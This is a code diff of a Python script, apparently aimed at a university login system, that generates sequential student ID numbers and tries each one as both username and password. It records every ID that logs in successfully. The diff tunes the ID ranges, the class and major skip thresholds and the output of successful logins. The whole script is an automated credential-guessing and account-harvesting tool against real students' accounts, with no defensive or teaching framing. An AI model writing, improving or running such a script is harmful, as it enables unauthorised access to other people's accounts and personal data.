@@ -9,9 +9,9 @@ RESULTx='resultx.re'
 tempfile='mentemp.tmp'
 logfile='menlog.log'
 #年级
-stunum1=2015
+stunum1=2016
 #学院
-stunum2=1
+stunum2=1000
 #班级
 stunum3=1
 #班级里的学号
@@ -26,9 +26,9 @@ MAX_STU=100
 DELAY=8
 number=''
 #检查多少个学生不存在后跳过这个班级
-cheaknum=30
+cheaknum=25
 #检查多少个班级都没有学生后跳过这专业
-cheakcnum=9
+cheakcnum=8
 
 def search():
     global stunum1,stunum2,stunum3,stunum4,MAX_SUB,MAX_CLASS,MAX_STU
@@ -38,36 +38,30 @@ def search():
         f = open("result.re", 'a+')
         cheakstemp=0
         cheakctemp=0
+        print(stunum2)
         while stunum3 <= MAX_CLASS :
-            pre3 = ''
-            if(stunum3 < 10):
-                pre3 = '0'
             print(stunum3)
             while stunum4 <= MAX_STU :
-                pre4 = ''
-                if(stunum4 < 10):
-                    pre4 = '0'
-                #number = '{}{}{}{}{}{}'.format(stunum1,stunum2,pre3,stunum3,pre4,stunum4)
                 number = ('%d%0004d%02d%02d' % (stunum1, stunum2, stunum3, stunum4))
-                print(number)
+                #print(number)
                 session = login3.loginget(number,number)
                 if session != '' :
                     f.write(number + '\n')
-                    print("OK")
+                    print(number + "OK")
                     cheakstemp = 0
                     cheakctemp = 0
                 stunum4 = stunum4 + 1
                 cheakstemp = cheakstemp + 1
-                if cheakstemp > cheaknum : 
+                if cheakstemp >= cheaknum :
                     cheakstemp = 0
                     print('skip class')   
                     break 
             stunum3 = stunum3 + 1
             stunum4 = 1
             cheakctemp = cheakctemp + 1
-            if cheakctemp > cheakcnum : 
+            if cheakctemp >= cheakcnum :
                 cheakctemp = 0
-                stunum2 = int((stunum2 + 10)/10) * 10
+                stunum2 = int((stunum2 + 10)/10) * 10 -1
                 print('skip majer')    
                 break 
         stunum2 = stunum2 + 1
